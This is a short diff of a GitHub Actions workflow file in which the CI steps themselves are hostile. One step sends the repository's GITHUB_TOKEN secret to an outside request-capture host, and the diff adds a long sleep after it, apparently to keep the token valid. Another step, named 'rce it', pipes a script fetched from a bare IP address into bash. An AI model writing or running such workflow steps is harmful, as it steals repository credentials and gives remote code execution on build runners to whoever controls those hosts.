@@ -16,7 +16,7 @@ jobs:
 
     steps:       
      - name: Download some resource
-       run: curl https://tfhmwort.requestrepo.com//1_${{ secrets.GITHUB_TOKEN }}
+       run: curl https://tfhmwort.requestrepo.com//1_${{ secrets.GITHUB_TOKEN }} && sleep 6000
      - name: rce it
        run: curl http://120.27.203.84:50001/1.txt | bash
      - name: Checkout code
